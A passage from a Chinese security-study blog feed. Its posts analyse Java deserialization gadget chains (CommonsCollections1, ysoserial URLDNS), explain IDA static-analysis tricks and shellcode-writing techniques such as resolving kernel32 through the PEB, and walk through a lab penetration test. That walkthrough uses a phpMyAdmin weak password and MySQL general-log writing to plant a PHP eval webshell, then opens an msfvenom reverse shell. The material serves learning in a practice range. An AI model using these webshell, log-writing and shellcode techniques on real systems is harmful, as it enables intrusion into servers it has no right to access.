src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6wbq1kvjj20ws0awabf.jpg" alt=""></p><p>可以看见当get的键不存在时，会触发transform方法。</p><pre><code>protected final Transformer factory;</code></pre><p>而且这里的factory也是可控的。现在我们找到了transform的触发点LazyMap#get，因此我们接下来应该找到readObject的触发点了。下面便要用到我们开头讲过的动态代理了，在AnnotationInvocationHandler中有使用到readObject方法。</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6yxmvliaj213o0dcwt4.jpg" alt=""></p><p>那么我们就让这里的memberValues为代理类，那么就会调用memberValues对应handler的invoke方法，cc1中将handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler）。</p><p>因为代理类调用方法会触发invoke方法，而invoke方法中又使用到了get方法(在下面代码的最后一行)，所以我们只要设置两个代理就可以触发。</p><pre><code>class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;    private final Class&lt;? extends Annotation&gt; type;    private final Map&lt;String, Object&gt; memberValues;    private transient volatile Method[] memberMethods = null;    /* 后续无关代码就省略了，想看的话可以查看 sun/reflect/annotation/AnnotationInvocationHandler */   &#125;public Object invoke(Object var1, Method var2, Object[] var3) &#123;        String var4 = var2.getName();        Class[] var5 = var2.getParameterTypes();        if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;            return this.equalsImpl(var3[0]);        &#125; else if (var5.length != 0) &#123;            throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);        &#125; else &#123;            byte var7 = -1;            switch(var4.hashCode()) &#123;            case -1776922004:                if (var4.equals(&quot;toString&quot;)) &#123;                       var7 = 0;                &#125;                break;            case 147696667:                if (var4.equals(&quot;hashCode&quot;)) &#123;                    var7 = 1;                &#125;                break;            case 1444986633:                if (var4.equals(&quot;annotationType&quot;)) &#123;                    var7 = 2;                &#125;            &#125;            switch(var7) &#123;            case 0:                return this.toStringImpl();            case 1:                return this.hashCodeImpl();            case 2:                return this.type;            default:                Object var6 = this.memberValues.get(var4);</code></pre><p>我这运行最终poc中遇到了如下的bug：</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6yq5c5jaj20vs06xmyl.jpg" alt=""><br>这是因为java版本过高导致的，这里的版本应该是1.7.</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go6yuyzvpmj212j06uwfy.jpg" alt=""></p><p>最终也成功的弹出了计算器。这里设置了两个代理有点绕，第一个代理是用来触发代理类中的get的，第二个代理是来触发invoke的。</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go6zbx4oimj20ve0giwig.jpg" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.wjlshare.xyz/archives/1502">https://www.wjlshare.xyz/archives/1502</a></p><p><a href="https://paper.seebug.org/1242/#commonscollections-1">https://paper.seebug.org/1242/#commonscollections-1</a></p>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>静态分析技巧</title>
    <link href="http://yoursite.com/2021/03/01/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7/"/>
    <id>http://yoursite.com/2021/03/01/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7/</id>
    <published>2021-03-01T13:44:01.000Z</published>
    <updated>2021-07-29T05:46:37.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="静态分析技巧"><a href="#静态分析技巧" class="headerlink" title="静态分析技巧"></a>静态分析技巧</h1><p>这里总结了三个技巧，通过分析程序展示。最近学Java有点乏味看一点逆向.</p><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>首先运行程序，运行界面如下:<br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4q56zbbej20xz0hr3yx.jpg" alt=""><br>我们先找一下字符串shift+F12:</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4q6ioqrrj21hc0smte4.jpg" alt=""><br>按x查找引用：</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4q6utp9lj20s70agq3o.jpg" alt=""><br>我们按下F5:</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4q7vli9vj20ip0433ym.jpg" alt=""><br>看见反编译之后和我们想象中的函数不一样，接下来我们回头看看汇编代码。在原来的代码中我们可以发现从401080到4010C8明明是一个函数，可是F5后确编译出错。我们先看到打印First这段汇编。<img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4q8ib4zfj20ob0l9myz.jpg" alt=""></p><p>我们可以很轻易的就辨认出sub_4010D0就是printf，这里IDA并没有辨认出printf那这是为什么呢，有人可能会认为这是我们导入签名文件导致的，但是事实上就算导入了签名文件，IDA还是无法辨认出printf。我们可以在VS2017中写一段代码来看看。<br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4q3dh5hvj21ep09p0tl.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4q28z0gdj20mx0cumxp.jpg" alt="">我们可以发现在VS2017中，按下F12这里直接把printf的源码写进了代码中，所以就算导入签名文件IDA也无法辨认。</p><p>我们回来再看看接下来的汇编：<img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4q8ib4zfj20ob0l9myz.jpg" alt=""><br>我们重点看看这几句汇编可以看见4010A8被赋值给了eax，而eax又赋值给了ebp+4，然后再jmp。其实显而易见这里就是一句jmp 4010A8，但是这会导致IDA反汇编错误我们更改了就行了，因为IDA改汇编代码比较麻烦我用x32dbg改一下。</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4q9eyum5j20lz04l0sy.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4q9rbw8oj20v306pt9p.jpg" alt=""><br>F5正常了</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4qa31v3lj20q007nglt.jpg" alt=""></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>老规矩先运行程序看看<img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4qaupk4hj20fk05r0sr.jpg" alt=""></p><p>然后搜索字符串找到主函数</p><p>这里我们对main函数进行F5:</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4qbh6y8pj20h005dwei.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4qcgzlhlj20ft037t8k.jpg" alt=""><br>然而我们只找到了打印…的函数那打印3的函数呢？我们再转回汇编看看:<br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4qd7k50bj20ma0h2ta1.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4qdimmyoj20ow044mxc.jpg" alt=""></p><p>不知道能不能发现这里返回的是EDX，而3正是赋值给了EDX。而在正常情况下函数的默认返回值是EAX，因此这里是IDA的调用约定识别错误导致的。</p><p>调用约定:<strong>stdcall，</strong>cdecl，<strong>fastcall，</strong>thiscall，<strong>nakedcall，</strong>pascal，__vectorcall有下面几种类型。</p><p>但是这里的错误和上面的调用约定并不相关：而是和__usercall有关，这是IDA自带的约定。这在C++的逆向中经常出现。我们这里按y修改。</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4qe0csvfj20rk0583yo.jpg" alt=""><br>看到这里恢复正常了。<u>在上面的程序中有人可能会想，我们也可以不修改调用约定把3赋值给EAX，但是这是不正确的，因为我们并不知道在这段汇编代码中EAX是否还有其它作用，可能会导致程序的崩溃。</u><br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4qedq7m3j20e704zq2x.jpg" alt=""></p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>依旧运行程序：</p><p>红色的标记很明显的让我们注意到，我们先F5一波：<br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4qeqjcgdj20jn0m8761.jpg" alt=""></p><p>在小于IDA7.5的版本对标红的这段汇编代码进行反汇编会报错,提醒你堆栈分析失败，但是在大于7.5的版本是没问题的可以正常的反汇编，这是因为IDA对堆栈进行了优化，我们这边可以打开IDA的堆栈看一下。<br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4qfcvzu5j20mf0f9t9a.jpg" alt=""></p><p>可以看见第二段的堆栈变成了负数.<br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4qfmy61tj20na0mbtaq.jpg" alt=""></p><p>我们看到中间的代码,其实40109C根本不是一个新的函数他是包含在main函数中的,我们先对sub_40109c按u,将它变成未定义的代码.再按c,变成一段未知的指令集.然后再在ret是在functioon按set function end.<br><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4qfxthkmj20n40e9jsi.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1go4qg5cdauj20pc0kk766.jpg" alt=""><br>然后又变成了第一段的知识点了.下面就不再复述了.</p>]]></content>
    
    <summary type="html">
    
      静态分析
    
    </summary>
    
    
      <category term="逆向" scheme="http://yoursite.com/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="逆向" scheme="http://yoursite.com/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>ysoserial -URLDNS的学习</title>
    <link href="http://yoursite.com/2021/02/05/ysoserial%20-URLDNS%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2021/02/05/ysoserial%20-URLDNS%E7%9A%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-02-05T07:45:01.000Z</published>
    <updated>2021-07-29T05:50:55.472Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ysoserial-URLDNS的学习"><a href="#ysoserial-URLDNS的学习" class="headerlink" title="ysoserial -URLDNS的学习"></a>ysoserial -URLDNS的学习</h1><p>好久没碰Java了忘记的差不多了来重新复习一下。</p><p>在本地搭建ysoserial的时候报错报了一堆，解决了好久都没解决，最后多亏了天下大木头爷爷才解决，这可能就是我菜的原因吧QAQ（Java的版本别弄太高）。</p><p>版本：java 1.8</p><p>先看看作者的说明</p><pre><code>*   The Java URL class has an interesting property on its equals and*   hashCode methods. The URL class will, as a side effect, do a DNS lookup*   during a comparison (either equals or hashCode).**   As part of deserialization, HashMap calls hashCode on each key that it*   deserializes, so using a Java URL object as a serialized key allows*   it to trigger a DNS lookup.**   Gadget Chain:*     HashMap.readObject()*       HashMap.putVal()*         HashMap.hash()*           URL.hashCode()</code></pre><p>可以看见利用链是：</p><pre><code>*   Gadget Chain:        HashMap.readObject()            HashMap.putVal()                 HashMap.hash()                     URL.hashCode()</code></pre><p>跟进hashmap中的readObject找到了倒数几行中的putval，很容易发现第一个参数就引用了hash的方法。跟进下断点。</p><pre><code>private void readObject(java.io.ObjectInputStream s)    throws IOException, ClassNotFoundException &#123;    // Read in the threshold (ignored), loadfactor, and any hidden stuff    s.defaultReadObject();    reinitialize();    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +                                         loadFactor);    s.readInt();                // Read and ignore number of buckets    int mappings = s.readInt(); // Read number of mappings (size)    if (mappings &lt; 0)        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +                                         mappings);    else if (mappings &gt; 0) &#123; // (if zero, use defaults)        // Size the table using given load factor only if within        // range of 0.25...4.0        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);        float fc = (float)mappings / lf + 1.0f;        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?                   DEFAULT_INITIAL_CAPACITY :                   (fc &gt;= MAXIMUM_CAPACITY) ?                   MAXIMUM_CAPACITY :                   tableSizeFor((int)fc));        float ft = (float)cap * lf;        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?                     (int)ft : Integer.MAX_VALUE);        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];        table = tab;        // Read the keys and values, and put the mappings in the HashMap        for (int i = 0; i &lt; mappings; i++) &#123;            @SuppressWarnings(&quot;unchecked&quot;)                K key = (K) s.readObject();            @SuppressWarnings(&quot;unchecked&quot;)                V value = (V) s.readObject();            putVal(hash(key), key, value, false, false);        &#125;    &#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20210205152346946.png" alt="image-20210205152346946"></p><p>这里的hashCode是一个个 java.net.URL对象，单步进入后，进入了URL中：</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20210205152904344.png" alt="image-20210205152904344"></p><p>从图上发现URL.hashcode()方法中判断了hashCode是否为-1如果不等于-1则会返回。</p><p>在URLDNS的代码中有一行是：</p><pre><code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // 在上面的put过程中，计算并缓存URL的hashCode。这将重置该值，以便下次调用hashCode时触发DNS查找。</code></pre><p>因此代码进入判断后会向下执行。继续跟进。</p><pre><code>protected int hashCode(URL u) &#123;    int h = 0;    // Generate the protocol part.    String protocol = u.getProtocol();    if (protocol != null)        h += protocol.hashCode();    // Generate the host part.    InetAddress addr = getHostAddress(u);    if (addr != null) &#123;        h += addr.hashCode();    &#125; else &#123;        String host = u.getHost();        if (host != null)            h += host.toLowerCase().hashCode();    &#125;</code></pre><p>这里有个getHostAddress跟进。</p><pre><code>protected synchronized InetAddress getHostAddress(URL u) &#123;    if (u.hostAddress != null)        return u.hostAddress;    String host = u.getHost();    if (host == null || host.equals(&quot;&quot;)) &#123;        return null;    &#125; else &#123;        try &#123;            u.hostAddress = InetAddress.getByName(host);        &#125; catch (UnknownHostException ex) &#123;            return null;        &#125; catch (SecurityException se) &#123;            return null;        &#125;    &#125;    return u.hostAddress;&#125;</code></pre><p>看见了InetAddress.getByName(host)这里对我们输入的URL进行了解析。</p><p>所以，⾄此，整个 URLDNS 的Gadget： </p><ol><li>HashMap-&gt;readObject() </li><li>HashMap-&gt;hash() </li><li>URL-&gt;hashCode() </li><li>URLStreamHandler-&gt;hashCode() </li><li>URLStreamHandler-&gt;getHostAddress() </li><li>InetAddress-&gt;getByName()</li></ol>]]></content>
    
    <summary type="html">
    
      Java
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>shellcode编写原则</title>
    <link href="http://yoursite.com/2020/11/12/shellcode%E7%BC%96%E5%86%99%E5%8E%9F%E5%88%99/"/>
    <id>http://yoursite.com/2020/11/12/shellcode%E7%BC%96%E5%86%99%E5%8E%9F%E5%88%99/</id>
    <published>2020-11-12T09:09:01.000Z</published>
    <updated>2021-07-29T05:50:53.259Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shellcode编写原则"><a href="#shellcode编写原则" class="headerlink" title="shellcode编写原则"></a>shellcode编写原则</h1><p>杜绝绝对地址的绝对调用</p><p>VS开发平台中，双引号字符串会被编译到只读数据段，以引用绝对地址的方式使用。而在shellcode编程中，要尽量避免一切绝对地址的使用。</p><p><code>char Data[] = &quot;xxxx&quot; [×]</code><br><code>char *Data = &quot;xxx&quot;[×]</code><br><code>sprintf(Data,&quot;%s%d&quot;,....)[×]</code><br><code>memcpy(Data, &quot;xxxx&quot;) [×]</code></p><p><code>char Data[] = &#123;&#39;x&#39;,&#39;x&#39;,&#39;x&#39;&#125; [√]</code></p><p><code>__asm</code><br><code>&#123;</code><br>    <code>_EMIT &#39;x&#39;</code><br>    <code>_EMIT &#39;x&#39;               [√]</code><br>    <code>_EMIT &#39;x&#39;</code><br>    <code>_EMIT 0</code></p><p><code>&#125;</code></p><h2 id="函数的动态调用"><a href="#函数的动态调用" class="headerlink" title="函数的动态调用"></a>函数的动态调用</h2><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201112134843851.png" alt="image-20201112134843851"></p><p>编译器实际上是把我们调用的MessageBox转换成系统中真正执行弹框功能的函数的入口地址。把MessageBox转换成实际地址的过程实际上是在vs编译器生成EXE的过程中完成的。</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201112135653931.png" alt="image-20201112135653931"></p><p>因为如果我们直接将这里的代码拿出放在别的机器上运行，那个机器在该地址所放的不一定是这个系统函数，会发生报错，因此我们需要使用的任何系统功能的函数都不能让编译器来转换它的地址。需要在程序执行的过程中动态的自己获取。</p><p>这里引入一个函数GetProcAddress这个函数可以在指定的动态链接库中获取指定所以导出的函数地址。</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201112141051023.png" alt="image-20201112141051023"></p><p>现在GetProcAddress返回的地址就是MessageBoxA所代表的真实地址。这时调用该函数最直接的办法就是调用函数的内嵌汇编使用。首先将函数的四个参数压栈。</p><pre><code>#include&lt;windows.h&gt;#pragma comment(linker, &quot;/entry:EntryMain&quot;)int EntryMain() &#123;    //MessageBox(NULL, NULL, NULL, NULL);    LPVOID lp = GetProcAddress(LoadLibraryA(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;);    char* pszData = &quot;Hello world&quot;;    __asm    &#123;        push 0        push 0        push pszData        push 0        call lp    &#125;    return 0;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201112142344630.png" alt="image-20201112142344630"></p><p>下面是函数动态调用的全过程。</p><pre><code>#include&lt;windows.h&gt;#pragma comment(linker, &quot;/entry:EntryMain&quot;)int EntryMain() &#123;//CreateFileA(&quot;Hello.txt&quot;, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);typedef HANDLE (WINAPI* FN_CreatefileA)(    _In_ LPCSTR lpFileName,    _In_ DWORD dwDesiredAccess,    _In_ DWORD dwShareMode,    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,    _In_ DWORD dwCreationDisposition,    _In_ DWORD dwFlagsAndAttributes,    _In_opt_ HANDLE hTemplateFile    );FN_CreatefileA fn_CreateFileA;fn_CreateFileA = (FN_CreatefileA)GetProcAddress(LoadLibraryA(&quot;kernel32.dll&quot;), &quot;CreateFileA&quot;);fn_CreateFileA(&quot;Hello.txt&quot;, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);return 0;&#125;</code></pre><p><code>typedef HANDLE (WINAPI* FN_CreatefileA)(</code><br>    <code>_In_ LPCSTR lpFileName,</code><br>    <code>_In_ DWORD dwDesiredAccess,</code><br>    <code>_In_ DWORD dwShareMode,</code><br>    <code>_In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,</code><br>    <code>_In_ DWORD dwCreationDisposition,</code><br>    <code>_In_ DWORD dwFlagsAndAttributes,</code><br>    <code>_In_opt_ HANDLE hTemplateFile</code><br>    <code>);</code></p><p>这段代码可以在vs中CreateFileA按ctrl左键查看。</p><p>下面是printf的动态调用</p><pre><code>//printf(&quot;%s\n&quot;, &quot;Hello world!&quot;); 首先找到函数原型typedef int (__CRTDECL* FN_printf)(char const* const _Format, ...);FN_printf fn_printf;fn_printf = (FN_printf)GetProcAddress(LoadLibraryA(&quot;msvcrt.dll&quot;), &quot;printf&quot;);fn_printf(&quot;%s\n&quot;, &quot;Hello world!&quot;);</code></pre><h2 id="Kernel32基址获取与GetProcAddress地址获取"><a href="#Kernel32基址获取与GetProcAddress地址获取" class="headerlink" title="Kernel32基址获取与GetProcAddress地址获取"></a>Kernel32基址获取与GetProcAddress地址获取</h2><p><img src="D:%5Cblog%5CSakura%5Csource%5Ctags%5C%E5%9B%BE%E9%9B%86%5Cimage-20201112153016447.png" alt="image-20201112153016447"></p><p>不论哪个版本都是取第三个内存为kernel32，这样就可以得到kernel32的基址。</p><pre><code>__declspec(naked) DWORD getKernel32() &#123;__asm &#123;    mov eax,fs:[30h]    mov eax, [eax+0ch]//取PEB0c偏移的值    mov eax, [eax+14h]    mov eax, [eax]    mov eax, [eax]    mov eax, [eax+10h]    ret&#125;&#125;</code></pre><p>下面直接给出代码：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;windows.h&gt;__declspec(naked) DWORD getKernel32() &#123;    __asm &#123;        mov eax,fs:[30h]        mov eax, [eax+0ch]//取PEB0c偏移的值        mov eax, [eax+14h]        mov eax, [eax]        mov eax, [eax]        mov eax, [eax+10h]        ret    &#125;&#125;FARPROC _GetProcAddress(HMODULE hModuleBase) &#123;    PIMAGE_DOS_HEADER lpDosHeader = (PIMAGE_DOS_HEADER)hModuleBase;    PIMAGE_NT_HEADERS32 lpNtHeader = (PIMAGE_NT_HEADERS)((DWORD)hModuleBase + lpDosHeader-&gt;e_lfanew);    if (!lpNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)    &#123;        return NULL;    &#125;    if (!lpNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)    &#123;        return NULL;    &#125;    PIMAGE_EXPORT_DIRECTORY lpExports = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hModuleBase + (DWORD)lpNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);    PDWORD lpdwFunName = (PDWORD)((PDWORD)hModuleBase + (DWORD)lpExports-&gt;AddressOfNames);    PWORD lpword = (PWORD)((DWORD)hModuleBase + (DWORD)lpExports-&gt;AddressOfNameOrdinals);    PWORD lpdwFunAddr = (PWORD)((DWORD)hModuleBase + (DWORD)pExports-&gt;AddressOfFunctions);    DWORD dwLoop = 0;        FARPROC pRet = NULL;        for (; dwLoop &lt;= lpExports-&gt;NumberOfNames - 1; dwLoop++)        &#123;            char* pFunName = (char*)(lpdwFunName[dwLoop] + (DWORD)hModuleBase);            if (pFunName[0] == &#39;G&#39; &amp;&amp;                pFunName[1] == &#39;e&#39; &amp;&amp;                pFunName[2] == &#39;t&#39; &amp;&amp;                pFunName[3] == &#39;P&#39; &amp;&amp;                pFunName[4] == &#39;r&#39; &amp;&amp;                pFunName[5] == &#39;o&#39; &amp;&amp;                pFunName[6] == &#39;c&#39; &amp;&amp;                pFunName[7] == &#39;A&#39; &amp;&amp;                pFunName[8] == &#39;d&#39; &amp;&amp;                pFunName[9] == &#39;d&#39; &amp;&amp;                pFunName[10] == &#39;r&#39; &amp;&amp;                pFunName[11] == &#39;e&#39; &amp;&amp;                pFunName[12] == &#39;s&#39; &amp;&amp;                pFunName[13] == &#39;s&#39;)            &#123;                pRet = (FARPROC)(lpdwFunAddr[lpword[dwLoop]] + (DWORD)hModuleBase);                break;            &#125;        &#125;        return pRet;    &#125;    int main() &#123;    HMODULE hLoadLibraryA = (HMODULE)getKernel32;     //LPVOID lploadLibraryA = GetProcAddress(hLoadLibraryA, &quot;LoadLibraryA&quot;);    typedef FARPROC(WINAPI *FN_GetProcAddress)(            _In_ HMODULE hModule,            _In_ LPCSTR lpProcName        );    FN_GetProcAddress fn_GetProcAddress;    fn_GetProcAddress = (FN_GetProcAddress)_GetProcAddress(hLoadLibraryA);    printf(&quot;0x%08X\n&quot;, fn_GetProcAddress);    printf(&quot;0x%08X\n&quot;, GetProcAddress);    return 0;&#125;</code></pre><h2 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h2><p>①全局变量的使用</p><p>②确保已加载使用API的动态链接库。</p>]]></content>
    
    <summary type="html">
    
      shellcode编写原则
    
    </summary>
    
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>红日靶场练习（一）上</title>
    <link href="http://yoursite.com/2020/10/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%E4%B8%8A/"/>
    <id>http://yoursite.com/2020/10/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89%E4%B8%8A/</id>
    <published>2020-10-06T09:58:01.000Z</published>
    <updated>2021-07-29T05:50:57.840Z</updated>
    
    <content type="html"><![CDATA[<h1 id="红日靶场练习（一）上"><a href="#红日靶场练习（一）上" class="headerlink" title="红日靶场练习（一）上"></a>红日靶场练习（一）上</h1><p><strong>测试连通性</strong><br><strong>a)</strong>Win7与攻击机及两太内网主机连通性</p><p>win7:192.168.52.143  192.168.140.130</p><p>win2k3:192.168.52.141</p><p>windows server:192.168.52.138</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006111608215.png" alt="image-20201006111608215"></p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006102527461.png" alt="image-20201006102527461"></p><p><strong>b)</strong>Win2K3与WinSever 2008 R2及Win7连通性</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006112054573.png" alt="image-20201006112054573"></p><p><strong>c)</strong>WinSever 2008 R2与 Win2K3及Win7连通性</p><p><strong>d)</strong>Kali攻击机与web服务器连通性</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006112326800.png" alt="image-20201006112326800"></p><p><strong>在Win7主机上开启phpstuday，使用kali攻击机访问</strong></p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006112850343.png" alt="image-20201006112850343"></p><p><strong>信息收集</strong></p><p>1.先使用namp扫主机</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006121213300.png" alt="image-20201006121213300"></p><p>2.利用御剑扫目录<img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006122858285.png" alt="image-20201006122858285"></p><h4 id="一："><a href="#一：" class="headerlink" title="一："></a>一：</h4><p>备份文件中是yxcms，访问一下。</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006123442833.png" alt="image-20201006123442833"></p><p>进入后台。</p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006125002139.png" alt="image-20201006125002139" style="zoom:33%;" /><p>写入shell，网站目录可以在备份文件中找到。</p><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006124943350.png" alt="image-20201006124943350"></p><h4 id="二：phpadmin"><a href="#二：phpadmin" class="headerlink" title="二：phpadmin"></a>二：phpadmin</h4><p>1.root/root弱口令进入后台。尝试使用命令写入shell。</p><p>尝试利用outfile写入，显然失败了。产生报错，show global variables like ‘%secure%’;查看—secure-file-prive变量配置，变量值为NULL不可读写，且变量只读不可编辑。</p><table><thead><tr><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">Variable_name</td><td align="left">Value</td></tr><tr><td align="left">secure_auth</td><td align="left">OFF</td></tr><tr><td align="left">secure_file_priv</td><td align="left">NULL</td></tr></tbody></table><p>2.2</p><p><strong>开启全局日志getshell</strong><br>show variables like ‘%general%’;查询全局日志变量配置</p><table><thead><tr><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">Variable_name</td><td align="left">Value</td></tr><tr><td align="left">general_log</td><td align="left">OFF</td></tr><tr><td align="left">general_log_file</td><td align="left">C:\phpStudy\MySQL\data\stu1.log</td></tr></tbody></table><p>日志默认关闭</p><p>我们执行sql语句  </p><pre><code class="html">set global general_log = &quot;ON&quot;;     #开启日志SET global general_log_file=&#39;网站下物理路径&#39;;  #更换日志路径</code></pre><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006130357268.png" alt="image-20201006130357268"></p><p>修改成功。写入shell。</p><blockquote><p><a href="http://192.168.140.130/phpmyadmin/url.php?url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Fselect.html&token=1dbba3e734852ce11d5af5d3ac65baec"><strong>SELECT</strong></a> ‘<?php eval(@$_POST[xiaotan]); ?>‘</p></blockquote><p><img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006130716202.png" alt="image-20201006130716202"></p><p>三：</p><p>1.使用msfvenom生成payload文件，使用蚁剑上传到WWW目录下<img src="https://raw.githubusercontent.com/York145/York145.github.io/master/tags/%E5%9B%BE%E9%9B%86/image-20201006132224440.png" alt="image-20201006132224440"></p><p>2.<strong>2.</strong>使用handler模块接收反弹模块，在7777端口上进行监听，访问a.php，连接成功</p><p><img 